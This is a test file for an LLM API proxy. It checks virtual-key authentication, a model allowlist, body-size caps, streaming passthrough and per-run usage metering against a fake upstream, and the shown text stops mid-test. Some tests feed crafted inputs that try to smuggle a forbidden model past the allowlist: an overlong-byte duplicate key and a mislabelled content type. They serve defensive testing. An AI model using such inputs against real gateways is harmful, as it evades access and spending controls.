// The data plane, driven in-process with a fake upstream: authentication, the frozen
// allowlist, live provider-key liveness, header rewriting, passthrough, and metering.

import { test } from "bun:test";
import { assert, assertEquals, assertRejects } from "@std/assert";
import { forwardTarget, makeProxyHandler } from "../src/http/proxy.ts";
import { makeCredentialIssuer } from "../src/core/service.ts";
import { memoryKeyStore } from "./memory_store.ts";
import { BUILTIN_PROVIDERS } from "../src/core/registry.ts";
import { makeDeploymentGauge, makeSpendMeter } from "../src/core/spend_meter.ts";
import type { CustomProvider, ProviderKey, UsageRecord } from "../src/core/types.ts";
import { usageRow } from "./usage_fixtures.ts";
import { spendOfRun } from "../src/core/spend.ts";
import { serve } from "@ryph/service";
import { publicDns } from "./dns.ts";
import type { ResolveHost } from "../src/schema.ts";

const T0 = "2026-01-01T00:00:00.000Z";

const silentDiag = { debug() {}, warn() {} };

function providerKey(overrides: Partial<ProviderKey> = {}): ProviderKey {
  return {
    id: "pk-1",
    provider: "anthropic",
    label: "team key",
    last4: "cret",
    encryptedSecret: "sealed:sk-ant-realkey",
    archivedAt: null,
    createdAt: T0,
    updatedAt: T0,
    ...overrides,
  };
}

/** A full slice: a real store, a really-minted virtual key, a recording fake upstream. */
async function makeSlice(opts: {
  key?: ProviderKey;
  /** A custom endpoint to register before the key is issued against it. */
  custom?: CustomProvider;
  allowedModels?: string[] | "*";
  nowMs?: number;
  upstream?: (req: Request) => Response | Promise<Response>;
  /** The run's caps, frozen onto its credential. */
  spendUsd?: number;
  callsInFlight?: number;
  /** The deployment's ceiling. */
  ceiling?: { usd: number; windowDays: number };
  backstopMs?: number;
  /** Rows already in the trail when the proxy first sees the run — what a restart reseeds from. */
  trail?: UsageRecord[];
  decrypt?: (sealed: string) => Promise<string>;
  maxRequestBodyBytes?: number;
  drainMs?: number;
  resolveHost?: ResolveHost;
  /** A real upstream to forward to with the real fetch, in place of the recording fake. */
  realUpstream?: string;
} = {}) {
  const store = memoryKeyStore();
  const key = opts.key ?? providerKey();
  if (opts.custom) await store.createCustomProvider(opts.custom);
  await store.createProviderKey(key);
  for (const row of opts.trail ?? []) await store.recordUsage(row);
  const clock = { nowMs: opts.nowMs ?? Date.parse(T0) };
  const issuer = makeCredentialIssuer({
    store,
    now: () => new Date(T0),
    proxyUrl: "http://proxy.test",
    ttlMs: 60_000,
  });
  const env = await issuer.issue({
    runId: "r-1",
    agentId: "a-1",
    taskId: "t-1",
    providerKeyId: key.id,
    provider: key.provider,
    allowedModels: opts.allowedModels ?? "*",
    spendUsd: opts.spendUsd ?? null,
    callsInFlight: opts.callsInFlight ?? null,
  });

  const upstreamRequests: Array<
    {
      url: string;
      headers: Headers;
      body: string;
      bytes: Uint8Array;
      redirect: RequestInit["redirect"];
    }
  > = [];
  const upstream = opts.upstream ?? (() => Response.json({ ok: true }));
  const handler = makeProxyHandler({
    resolveHost: opts.resolveHost ?? publicDns,
    store,
    // The "sealed" fixture format keeps the crypto out of the proxy's own test.
    decrypt: opts.decrypt ?? ((sealed) => Promise.resolve(sealed.replace(/^sealed:/, ""))),
    now: () => new Date(clock.nowMs),
    diag: silentDiag,
    limits: {
      meter: makeSpendMeter({ backstopMs: opts.backstopMs ?? 30_000 }),
      gauge: opts.ceiling === undefined ? null : makeDeploymentGauge({
        ceilingUsd: opts.ceiling.usd,
        windowDays: opts.ceiling.windowDays,
      }),
    },
    ...(opts.maxRequestBodyBytes === undefined
      ? {}
      : { maxRequestBodyBytes: opts.maxRequestBodyBytes }),
    ...(opts.drainMs === undefined ? {} : { drainMs: opts.drainMs }),
    ...(opts.realUpstream === undefined ? {} : { baseUrlFor: () => opts.realUpstream! }),
    upstreamFetch: opts.realUpstream !== undefined ? fetch : (async (
      input: URL | Request | string,
      init?: RequestInit,
    ) => {
      const req = input instanceof Request
        ? new Request(input, init)
        : new Request(String(input), init);
      const bytes = new Uint8Array(await req.arrayBuffer());
      upstreamRequests.push({
        url: req.url,
        headers: req.headers,
        body: new TextDecoder().decode(bytes),
        bytes,
        // Recorded because it is a SECURITY option, not a preference: the real fetch would
        // carry `x-api-key` and `api-key` across a cross-origin redirect.
        redirect: req.redirect,
      });
      return upstream(req);
    }) as typeof fetch,
  });
  return { handler, store, env, upstreamRequests, issuer, clock };
}

function messages(token: string | null, body: unknown, headerName = "x-api-key"): Request {
  return new Request("http://proxy.test/v1/messages?beta=true", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "anthropic-version": "2023-06-01",
      ...(token === null ? {} : { [headerName]: token }),
    },
    body: JSON.stringify(body),
  });
}

test("a valid virtual key forwards: real key in, virtual key gone, path and body verbatim", async () => {
  const { handler, env, upstreamRequests } = await makeSlice();
  const res = await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));
  assertEquals(res.status, 200);
  assertEquals(await res.json(), { ok: true });

  assertEquals(upstreamRequests.length, 1);
  const seen = upstreamRequests[0];
  assertEquals(seen.url, "https://api.anthropic.com/v1/messages?beta=true");
  assertEquals(seen.headers.get("x-api-key"), "sk-ant-realkey");
  assertEquals(seen.headers.get("anthropic-version"), "2023-06-01"); // pass-through survives
  assert(!seen.body.includes("ryph-vk-"), "the virtual key never reaches the provider");
  assertEquals(JSON.parse(seen.body), { model: "claude-sonnet-5" });
});

test("an openai-backed key rides the bearer header instead", async () => {
  const { handler, env, upstreamRequests } = await makeSlice({
    key: providerKey({ provider: "openai", encryptedSecret: "sealed:sk-oai-realkey" }),
  });
  const req = new Request("http://proxy.test/v1/chat/completions", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${env.OPENAI_API_KEY}`,
    },
    body: JSON.stringify({ model: "gpt-5" }),
  });
  assertEquals((await handler(req)).status, 200);
  assertEquals(upstreamRequests[0].url, "https://api.openai.com/v1/chat/completions");
  assertEquals(upstreamRequests[0].headers.get("authorization"), "Bearer sk-oai-realkey");
});

test("no token, an unknown token, an expired token, a revoked run: identical 401s", async () => {
  const { handler, env, issuer } = await makeSlice({ nowMs: Date.parse(T0) });
  assertEquals((await handler(messages(null, {}))).status, 401);
  assertEquals((await handler(messages("ryph-vk-forged", {}))).status, 401);

  const { handler: late, env: lateEnv } = await makeSlice({
    nowMs: Date.parse(T0) + 61_000, // past the 60s ttl
  });
  assertEquals((await late(messages(lateEnv.ANTHROPIC_API_KEY, {}))).status, 401);

  await issuer.revokeForRun("r-1");
  assertEquals((await handler(messages(env.ANTHROPIC_API_KEY, {}))).status, 401);
});

test("a body over the cap is refused 413 as it streams, and an unknown token's body is never read", async () => {
  const { handler, env, upstreamRequests, store } = await makeSlice({ maxRequestBodyBytes: 64 });
  const under = await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));
  assertEquals(under.status, 200);
  await under.body?.cancel();

  // Chunked — no length announced, so only the count as it arrives can refuse it.
  const chunk = new TextEncoder().encode(`{"model":"claude-sonnet-5","pad":"${"x".repeat(40)}`);
  const chunked = (pulls: { n: number }) =>
    new ReadableStream<Uint8Array>({
      pull(controller) {
        // Finite, so the test without a cap fails rather than hangs: twenty chunks, ~1 KB.
        pulls.n += 1;
        if (pulls.n > 20) controller.close();
        else controller.enqueue(chunk);
      },
    });
  const pulls = { n: 0 };
  const over = await handler(
    new Request("http://proxy.test/v1/messages", {
      method: "POST",
      headers: { "x-api-key": env.ANTHROPIC_API_KEY, "content-type": "application/json" },
      body: chunked(pulls),
    }),
  );
  assertEquals(over.status, 413);
  assert(pulls.n <= 3, `read ${pulls.n} chunks past a 64-byte cap`);
  // Announced over the cap: refused before a byte is read.
  const announced = await handler(
    new Request("http://proxy.test/v1/messages", {
      method: "POST",
      headers: { "x-api-key": env.ANTHROPIC_API_KEY, "content-length": "1000000" },
      body: "{}",
    }),
  );
  assertEquals(announced.status, 413);

  // A caller with no live credential is answered before its body is touched at all.
  const strangerPulls = { n: 0 };
  const stranger = await handler(
    new Request("http://proxy.test/v1/messages", {
      method: "POST",
      headers: { "x-api-key": "not-a-key" },
      body: chunked(strangerPulls),
    }),
  );
  assertEquals(stranger.status, 401);
  assert(strangerPulls.n <= 1, "an unauthenticated body was read");
  assertEquals(upstreamRequests.length, 1);
  assertEquals((await store.listUsageForRun("r-1")).length, 1);
});

test("the body is forwarded byte for byte, however it arrived, and its model still read", async () => {
  const { handler, env, upstreamRequests } = await makeSlice({
    allowedModels: ["claude-sonnet-5"],
  });
  // A few hundred kilobytes in uneven chunks with no length announced — past any first guess
  // at a buffer — and a byte order mark, which a decode would drop.
  const enc = new TextEncoder();
  const sent = new Uint8Array([
    0xef,
    0xbb,
    0xbf,
    ...enc.encode(`{"model":"claude-sonnet-5","pad":"`),
    ...enc.encode("x".repeat(300_000)),
    ...enc.encode(`é😀"}`),
  ]);
  let at = 0;
  let size = 1;
  const body = new ReadableStream<Uint8Array>({
    pull(controller) {
      if (at >= sent.length) return controller.close();
      controller.enqueue(sent.slice(at, at + size));
      at += size;
      size = size * 3 + 7;
    },
  });
  const res = await handler(
    new Request("http://proxy.test/v1/messages", {
      method: "POST",
      headers: { "x-api-key": env.ANTHROPIC_API_KEY, "content-type": "application/json" },
      body,
    }),
  );
  assertEquals(res.status, 200);
  await res.body?.cancel();
  assertEquals(upstreamRequests.length, 1);
  assertEquals(upstreamRequests[0].bytes, sent);

  // Announced, and the allowlist still bites on what it names.
  const refused = await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-opus-9" }));
  assertEquals(refused.status, 403);
  await refused.body?.cancel();
  assertEquals(upstreamRequests.length, 1);

  // Bytes that are not UTF-8 name no model, however the allowed one reads: one decoder makes
  // the second key `mod\uFFFD\uFFFDl`, another (decoding the overlong c1 a5 as `e`) `model`.
  const garbled = await handler(
    new Request("http://proxy.test/v1/messages", {
      method: "POST",
      headers: { "x-api-key": env.ANTHROPIC_API_KEY, "content-type": "application/json" },
      body: new Uint8Array([
        ...enc.encode(`{"model":"claude-sonnet-5","mod`),
        0xc1,
        0xa5,
        ...enc.encode(`l":"claude-opus-9"}`),
      ]),
    }),
  );
  assertEquals(garbled.status, 403);
  await garbled.body?.cancel();
  assertEquals(upstreamRequests.length, 1);
});

test("the frozen allowlist is enforced server-side; a listless request passes", async () => {
  const { handler, env, upstreamRequests } = await makeSlice({
    allowedModels: ["claude-sonnet-5"],
  });
  const denied = await handler(
    messages(env.ANTHROPIC_API_KEY, { model: "claude-opus-4-8" }),
  );
  assertEquals(denied.status, 403);
  assert((await denied.json()).error.includes("claude-opus-4-8"));
  assertEquals(upstreamRequests.length, 0, "a denied request never reaches the provider");

  // A GET (e.g. the provider's models list) names no model: policy has nothing to refuse.
  const listReq = new Request("http://proxy.test/v1/models", {
    headers: { "x-api-key": env.ANTHROPIC_API_KEY },
  });
  assertEquals((await handler(listReq)).status, 200);
});

test("archiving the backing key cuts off an in-flight run: 403, not 401", async () => {
  const { handler, store, env } = await makeSlice();
  const key = (await store.getProviderKey("pk-1"))!;
  await store.saveProviderKey({ ...key, archivedAt: T0 });
  const res = await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));
  assertEquals(res.status, 403);
  assert((await res.json()).error.includes("revoked"));
});

test("every forwarded request lands one usage row; a denied one lands none", async () => {
  const { handler, store, env } = await makeSlice({ allowedModels: ["claude-sonnet-5"] });
  // A row is written when the response body ends, so both bodies are read.
  await (await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }))).text();
  await (await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-opus-4-8" }))).text(); // denied
  const usage = await store.listUsageForRun("r-1");
  assertEquals(usage.length, 1);
  assertEquals(usage[0].model, "claude-sonnet-5");
  assertEquals(usage[0].provider, "anthropic");
  assertEquals(usage[0].status, 200);
});

test("a streaming upstream body passes through, and encoding headers are dropped", async () => {
  const { handler, env } = await makeSlice({
    upstream: () =>
      new Response(
        new ReadableStream({
          start(controller) {
            controller.enqueue(new TextEncoder().encode("event: message_start\n\n"));
            controller.enqueue(new TextEncoder().encode("event: message_stop\n\n"));
            controller.close();
          },
        }),
        {
          headers: {
            "content-type": "text/event-stream",
            "content-encoding": "gzip", // fetch already decoded; forwarding this would lie
          },
        },
      ),
  });
  const res = await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));
  assertEquals(res.headers.get("content-type"), "text/event-stream");
  assertEquals(res.headers.get("content-encoding"), null);
  assertEquals(await res.text(), "event: message_start\n\nevent: message_stop\n\n");
});

// Over real sockets on both legs, since an in-process Response cannot show buffering: the first
// event must reach the client while the upstream is still holding the rest of the stream.
test("a streamed completion reaches the client event by event, not when the upstream ends", async () => {
  const enc = new TextEncoder();
  let release!: () => void;
  const held = new Promise<void>((resolve) => release = resolve);
  const upstream = await serve(
    { port: 0, hostname: "127.0.0.1", onListen() {} },
    () =>
      new Response(
        new ReadableStream({
          async start(controller) {
            controller.enqueue(enc.encode("event: message_start\n\n"));
            await held;
            controller.enqueue(enc.encode("event: message_stop\n\n"));
            controller.close();
          },
        }),
        { headers: { "content-type": "text/event-stream" } },
      ),
  );
  const { handler, env } = await makeSlice({
    realUpstream: `http://127.0.0.1:${upstream.addr.port}`,
  });
  const proxy = await serve({ port: 0, hostname: "127.0.0.1", onListen() {} }, handler);
  try {
    const req = messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" });
    const res = await fetch(`http://127.0.0.1:${proxy.addr.port}/v1/messages?beta=true`, {
      method: "POST",
      headers: req.headers,
      body: await req.text(),
    });
    assertEquals(res.status, 200);
    const reader = res.body!.getReader();
    const dec = new TextDecoder();
    let first = "";
    while (!first.includes("\n\n")) {
      const { value, done } = await reader.read();
      assert(!done, "the stream ended before its first event");
      first += dec.decode(value, { stream: true });
    }
    assertEquals(first, "event: message_start\n\n", "the first event arrived on its own");
    release();
    let rest = "";
    while (true) {
      const { value, done } = await reader.read();
      if (done) break;
      rest += dec.decode(value, { stream: true });
    }
    assertEquals(rest, "event: message_stop\n\n");
  } finally {
    release();
    await proxy.shutdown();
    await upstream.shutdown();
  }
});

test("an unreachable upstream answers 502, never a hang or a throw", async () => {
  const { handler, env } = await makeSlice({
    upstream: () => {
      throw new Error("connection refused");
    },
  });
  const res = await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));
  assertEquals(res.status, 502);
});

const sseChunk = (event: unknown) => `event: x\ndata: ${JSON.stringify(event)}\n\n`;

test("a streamed completion's usage lands on its row when the body ends, attributed to the run", async () => {
  const chunks = [
    sseChunk({
      type: "message_start",
      message: { usage: { input_tokens: 40, cache_read_input_tokens: 900 } },
    }),
    sseChunk({ type: "content_block_delta", delta: { type: "text_delta", text: "hi" } }),
    sseChunk({ type: "message_delta", usage: { output_tokens: 256 } }),
  ];
  const { handler, store, env } = await makeSlice({
    upstream: () =>
      new Response(
        new ReadableStream({
          start(controller) {
            for (const chunk of chunks) controller.enqueue(new TextEncoder().encode(chunk));
            controller.close();
          },
        }),
        { headers: { "content-type": "text/event-stream" } },
      ),
  });
  const res = await handler(
    messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5", stream: true }),
  );
  assertEquals(await store.listUsageForRun("r-1"), [], "no row while the stream is open");
  assertEquals(await res.text(), chunks.join(""), "the stream passes through untouched");

  const usage = await store.listUsageForRun("r-1");
  assertEquals(usage.length, 1);
  const [row] = usage;
  assertEquals([row.agentId, row.taskId, row.model], ["a-1", "t-1", "claude-sonnet-5"]);
  assertEquals(
    [row.inputTokens, row.outputTokens, row.cacheReadTokens, row.cacheWriteTokens],
    [40, 256, 900, 0],
  );
  assertEquals([row.durationMs, row.at], [0, T0]);
});

/** The run's rows once `count` have been written: a hung-up call's row is written by a read
 * that goes on in the background. */
async function rowsOnceWritten(
  store: { listUsageForRun(runId: string): Promise<UsageRecord[]> },
  count: number,
): Promise<UsageRecord[]> {
  for (let tries = 0; tries < 400; tries++) {
    const rows = await store.listUsageForRun("r-1");
    if (rows.length >= count) return rows;
    await Bun.sleep(5);
  }
  throw new Error("the row was never written");
}

/** An upstream stream the test feeds by hand, and whether it was cancelled. */
function handFed() {
  let feed!: ReadableStreamDefaultController<Uint8Array>;
  const state = { cancelled: false };
  const body = new ReadableStream<Uint8Array>({
    start(controller) {
      feed = controller;
    },
    cancel() {
      state.cancelled = true;
    },
  });
  const send = (event: unknown) => feed.enqueue(new TextEncoder().encode(sseChunk(event)));
  return { body, send, close: () => feed.close(), state };
}

test("a caller that hangs up mid-stream does not end the call: it is read on for its usage", async () => {
  // Hanging up before Anthropic's closing `message_delta` used to leave a row with the input
  // and none of the output: a run could have its every answer priced at its prompt alone.
  const upstream = handFed();
  const { handler, store, env } = await makeSlice({
    upstream: () =>
      new Response(upstream.body, { headers: { "content-type": "text/event-stream" } }),
  });
  upstream.send({ type: "message_start", message: { usage: { input_tokens: 70 } } });
  const res = await handler(
    messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5", stream: true }),
  );
  const reader = res.body!.getReader();
  await reader.read();
  await reader.cancel("caller went away");

  upstream.send({ type: "message_delta", usage: { output_tokens: 30 } });
  upstream.send({ type: "message_stop" });
  upstream.close();
  const [row] = await rowsOnceWritten(store, 1);
  assertEquals([row.inputTokens, row.outputTokens, row.estimated], [70, 30, false]);
  assertEquals(row.status, 499, "still a cut stream to the report");
  assert(!upstream.state.cancelled, "read to its end");
});

test("past the drain deadline the call is cut, and charged the estimate rather than nothing", async () => {
  const upstream = handFed();
  const { handler, store, env } = await makeSlice({
    drainMs: 30,
    upstream: () =>
      new Response(upstream.body, { headers: { "content-type": "text/event-stream" } }),
  });
  upstream.send({ type: "message_start", message: { usage: { input_tokens: 70 } } });
  const res = await handler(
    messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5", stream: true, max_tokens: 500 }),
  );
  const reader = res.body!.getReader();
  await reader.read();
  await reader.cancel("caller went away");

  const [row] = await rowsOnceWritten(store, 1);
  // The input the stream did report stands; the output is the most the request allowed.
  assertEquals([row.inputTokens, row.outputTokens, row.estimated], [70, 500, true]);
  assert(upstream.state.cancelled, "dropped at the deadline");
});

test("a caller that leaves before the answer's headers still gets the call metered", async () => {
  let answer!: (res: Response) => void;
  const { handler, store, env } = await makeSlice({
    upstream: () => new Promise<Response>((resolve) => (answer = resolve)),
  });
  const caller = new AbortController();
  const req = messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" });
  const pending = handler(new Request(req, { signal: caller.signal }));
  for (let tries = 0; answer === undefined && tries < 200; tries++) await Bun.sleep(5);
  caller.abort();
  answer(Response.json({ usage: { input_tokens: 9, output_tokens: 4 } }));
  await pending;
  const [row] = await rowsOnceWritten(store, 1);
  assertEquals([row.inputTokens, row.outputTokens, row.estimated], [9, 4, false]);
});

test("a call answered 200 without any usage is charged an estimate, and the cap counts it", async () => {
  const { handler, store, env } = await makeSlice({
    spendUsd: 100,
    upstream: () => Response.json({ content: [{ type: "text", text: "hi" }] }),
  });
  const body = { model: "claude-sonnet-5", max_tokens: 1000, messages: [] };
  await (await handler(messages(env.ANTHROPIC_API_KEY, body))).text();
  const [row] = await store.listUsageForRun("r-1");
  assertEquals(row.estimated, true);
  assertEquals(row.inputTokens, Math.ceil(JSON.stringify(body).length / 4));
  assertEquals(row.outputTokens, 1000);
  assert((await spendOfRun(store, "r-1")).spentUsd > 0, "an estimated row is priced");

  // Free and failed calls are not: counting tokens, and an error.
  const { handler: free, store: freeStore, env: freeEnv } = await makeSlice({
    upstream: () => Response.json({ input_tokens: 12 }),
  });
  await (await free(
    new Request("http://proxy.test/v1/messages/count_tokens", {
      method: "POST",
      headers: { "content-type": "application/json", "x-api-key": freeEnv.ANTHROPIC_API_KEY },
      body: JSON.stringify({ model: "claude-sonnet-5", messages: [] }),
    }),
  )).text();
  const [counted] = await freeStore.listUsageForRun("r-1");
  assertEquals([counted.inputTokens, counted.estimated], [null, false]);
});

test("a streamed Chat Completions call is made to ask for its usage", async () => {
  const { call, upstreamRequests } = await openAiSlice();
  await (await call("POST", "/v1/chat/completions", { model: "gpt-5", stream: true })).text();
  await (await call("POST", "/v1/chat/completions", {
    model: "gpt-5",
    stream: true,
    stream_options: { include_usage: false, include_obfuscation: false },
  })).text();
  await (await call("POST", "/v1/chat/completions", { model: "gpt-5", stream: false })).text();
  const sent = upstreamRequests.map((r) => JSON.parse(r.body));
  assertEquals(sent[0].stream_options, { include_usage: true });
  assertEquals(sent[0].model, "gpt-5");
  assertEquals(sent[1].stream_options, { include_usage: true, include_obfuscation: false });
  assertEquals(sent[2].stream_options, undefined);

  // A custom endpoint's model declared not to take the option is sent as it came.
  const custom = await makeSlice({
    custom: customProvider({
      models: [{ id: "llama-4", compat: { supportsUsageInStreaming: false } }],
    }),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
  });
  await (await custom.handler(
    new Request("http://proxy.test/v1/chat/completions", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${custom.env.RYPH_MODEL_API_KEY}`,
      },
      body: JSON.stringify({ model: "llama-4", stream: true }),
    }),
  )).text();
  assertEquals(JSON.parse(custom.upstreamRequests[0].body).stream_options, undefined);
});

test("a JSON completion is metered; an error without usage is a row with no tokens", async () => {
  let reply = () => Response.json({ usage: { input_tokens: 5, output_tokens: 7 } });
  const { handler, store, env } = await makeSlice({ upstream: () => reply() });
  await (await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }))).text();
  reply = () => Response.json({ type: "error" }, { status: 529 });
  await (await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }))).text();

  const [ok, failed] = await store.listUsageForRun("r-1");
  assertEquals([ok.status, ok.inputTokens, ok.outputTokens], [200, 5, 7]);
  assertEquals([failed.status, failed.inputTokens, failed.outputTokens], [529, null, null]);
});

test("the row is priced on the model the RESPONSE names, not the one the request did", async () => {
  const { handler, store, env } = await makeSlice({
    key: providerKey({ provider: "openai", encryptedSecret: "sealed:sk-oai-realkey" }),
    upstream: () =>
      Response.json({
        object: "response",
        model: "gpt-5.4",
        usage: { input_tokens: 10, output_tokens: 2 },
      }),
  });
  // The request names an alias; what was served, and is priced, is the snapshot.
  const req = new Request("http://proxy.test/v1/responses", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${env.OPENAI_API_KEY}`,
    },
    body: JSON.stringify({ model: "gpt-5" }),
  });
  await (await handler(req)).text();

  const [row] = await store.listUsageForRun("r-1");
  assertEquals(row.model, "gpt-5.4");
  assertEquals([row.inputTokens, row.outputTokens], [10, 2]);
});

test("openai Responses: /v1/responses streams through verbatim and is metered off response.completed", async () => {
  const chunks = [
    sseChunk({
      type: "response.created",
      response: { id: "resp_1", model: "gpt-5-2026-01-01", usage: null },
    }),
    sseChunk({ type: "response.reasoning_summary_text.delta", delta: "considering usage" }),
    sseChunk({ type: "response.output_text.delta", delta: "hi" }),
    sseChunk({
      type: "response.completed",
      response: {
        id: "resp_1",
        model: "gpt-5-2026-01-01",
        output: [{ type: "reasoning", encrypted_content: "gAAAA…" }],
        usage: {
          input_tokens: 10_000,
          input_tokens_details: { cached_tokens: 8_000 },
          output_tokens: 900,
          output_tokens_details: { reasoning_tokens: 600 },
          total_tokens: 10_900,
        },
      },
    }),
  ];
  const { handler, store, env, upstreamRequests } = await makeSlice({
    key: providerKey({ provider: "openai", encryptedSecret: "sealed:sk-oai-realkey" }),
    allowedModels: ["gpt-5"],
    upstream: () =>
      new Response(
        new ReadableStream({
          start(controller) {
            for (const chunk of chunks) controller.enqueue(new TextEncoder().encode(chunk));
            controller.close();
          },
        }),
        { headers: { "content-type": "text/event-stream" } },
      ),
  });
  // What pi sends: unstored, streamed, asking for the encrypted reasoning back so the next turn
  // can replay it — and replaying the previous turn's reasoning item in `input`.
  const request = {
    model: "gpt-5",
    stream: true,
    store: false,
    include: ["reasoning.encrypted_content"],
    reasoning: { effort: "medium", summary: "auto" },
    input: [
      { role: "user", content: [{ type: "input_text", text: "hello" }] },
      { type: "reasoning", id: "rs_0", encrypted_content: "gAAAA-previous", summary: [] },
    ],
  };
  const res = await handler(
    new Request("http://proxy.test/v1/responses", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${env.OPENAI_API_KEY}`,
        session_id: "sess-1",
      },
      body: JSON.stringify(request),
    }),
  );
  assertEquals(res.status, 200);
  assertEquals(res.headers.get("content-type"), "text/event-stream");
  assertEquals(await res.text(), chunks.join(""), "the stream passes through untouched");

  // The issuer's base URL for an openai run is the proxy's /v1, which is what pi appends
  // `/responses` to.
  assertEquals(env.OPENAI_BASE_URL, "http://proxy.test/v1");
  const [seen] = upstreamRequests;
  assertEquals(seen.url, "https://api.openai.com/v1/responses");
  assertEquals(seen.headers.get("authorization"), "Bearer sk-oai-realkey");
  assertEquals(seen.headers.get("session_id"), "sess-1");
  assertEquals(JSON.parse(seen.body), request, "the body, encrypted reasoning and all, verbatim");

  const [row] = await store.listUsageForRun("r-1");
  assertEquals([row.provider, row.status, row.model], ["openai", 200, "gpt-5-2026-01-01"]);
  assertEquals(
    [row.inputTokens, row.cacheReadTokens, row.outputTokens, row.reasoningTokens],
    [2_000, 8_000, 900, 600],
  );
});

test("openai Responses: a request is priced exactly like a Chat Completions one", async () => {
  // Same tokens down both paths of the same provider; the dialect changes the wire, not the bill.
  const responses = {
    model: "gpt-5",
    usage: {
      input_tokens: 2_000,
      input_tokens_details: { cached_tokens: 1_000 },
      output_tokens: 100,
      output_tokens_details: { reasoning_tokens: 40 },
    },
  };
  const chat = {
    model: "gpt-5",
    usage: {
      prompt_tokens: 2_000,
      prompt_tokens_details: { cached_tokens: 1_000 },
      completion_tokens: 100,
      completion_tokens_details: { reasoning_tokens: 40 },
    },
  };
  let reply: unknown = responses;
  const { handler, store, env, upstreamRequests } = await makeSlice({
    key: providerKey({ provider: "openai", encryptedSecret: "sealed:sk-oai-realkey" }),
    upstream: () => Response.json(reply),
  });
  const call = (path: string) =>
    handler(
      new Request(`http://proxy.test${path}`, {
        method: "POST",
        headers: {
          "content-type": "application/json",
          authorization: `Bearer ${env.OPENAI_API_KEY}`,
        },
        body: JSON.stringify({ model: "gpt-5" }),
      }),
    );
  await (await call("/v1/responses")).text();
  const once = (await spendOfRun(store, "r-1")).spentUsd;
  // 1,000 input at $1.25/M, 1,000 cached at $0.125/M, 100 output at $10/M.
  assertEquals(Math.round(once * 1e9), Math.round((1_000 * 1.25 + 1_000 * 0.125 + 100 * 10) * 1e3));

  // A Chat Completions caller on the same provider is still forwarded (OpenAI serves both).
  reply = chat;
  await (await call("/v1/chat/completions")).text();
  assertEquals(upstreamRequests[1].url, "https://api.openai.com/v1/chat/completions");
  const twice = (await spendOfRun(store, "r-1")).spentUsd;
  assertEquals(Math.round(twice * 1e9), Math.round(once * 2 * 1e9));
});

test("a streamed completion's row carries the model the stream opened with", async () => {
  const chunk = sseChunk({
    type: "message_start",
    message: { model: "claude-sonnet-5-20260101", usage: { input_tokens: 4 } },
  });
  const { handler, store, env } = await makeSlice({
    upstream: () =>
      new Response(
        new ReadableStream({
          start(controller) {
            controller.enqueue(new TextEncoder().encode(chunk));
            controller.close();
          },
        }),
        { headers: { "content-type": "text/event-stream" } },
      ),
  });
  // The request names the alias; the provider answers with the snapshot it actually served.
  await (await handler(
    messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5", stream: true }),
  )).text();

  const [row] = await store.listUsageForRun("r-1");
  assertEquals(row.model, "claude-sonnet-5-20260101");
});

test("a relabelled body cannot smuggle a model past the allowlist", async () => {
  const { handler, store, env, upstreamRequests } = await makeSlice({
    allowedModels: ["claude-sonnet-5"],
  });
  // Same JSON body, a content-type that says otherwise: the policy reads the body regardless.
  const req = new Request("http://proxy.test/v1/messages", {
    method: "POST",
    headers: { "content-type": "text/plain", "x-api-key": env.ANTHROPIC_API_KEY },
    body: JSON.stringify({ model: "claude-opus-4-8" }),
  });
  const res = await handler(req);
  assertEquals(res.status, 403);
  assert((await res.json()).error.includes("claude-opus-4-8"));
  assertEquals(upstreamRequests.length, 0, "a denied request never reaches the provider");
  assertEquals(await store.listUsageForRun("r-1"), [], "and never lands a row of spend");
});

test("a restricted run may not buy tokens without naming a model; an unrestricted one may", async () => {
  const restricted = await makeSlice({ allowedModels: ["claude-sonnet-5"] });
  const denied = await restricted.handler(
    // A completion request whose model this proxy cannot see: it fails closed.
    messages(restricted.env.ANTHROPIC_API_KEY, { prompt: { id: "pmpt_1" } }),
  );
  assertEquals(denied.status, 403);
  assert((await denied.json()).error.includes("names none"));
  assertEquals(restricted.upstreamRequests.length, 0);

  // With no allowlist there is nothing to enforce, so the same request goes through.
  const open = await makeSlice();
  const allowed = await open.handler(
    messages(open.env.ANTHROPIC_API_KEY, { prompt: { id: "pmpt_1" } }),
  );
  assertEquals(allowed.status, 200);
  await allowed.text();
});

test("a stream that does not finish is a failed row, not the 200 it opened with", async () => {
  const opening = sseChunk({ type: "message_start", message: { usage: { input_tokens: 70 } } });
  const streaming = (opts: { close: boolean; die?: boolean }) => () =>
    new Response(
      new ReadableStream({
        start(controller) {
          controller.enqueue(new TextEncoder().encode(opening));
          if (opts.close) controller.close();
        },
        pull() {
          if (opts.die) throw new Error("the upstream went away");
        },
      }),
      { headers: { "content-type": "text/event-stream" } },
    );
  const start = (
    slice: { handler: (r: Request) => Promise<Response>; env: Record<string, string> },
  ) =>
    slice.handler(
      messages(slice.env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5", stream: true }),
    );

  // The caller hangs up on a completion that was still arriving.
  const hungUp = await makeSlice({ upstream: streaming({ close: false }), drainMs: 20 });
  const reader = (await start(hungUp)).body!.getReader();
  await reader.read();
  await reader.cancel("caller went away");
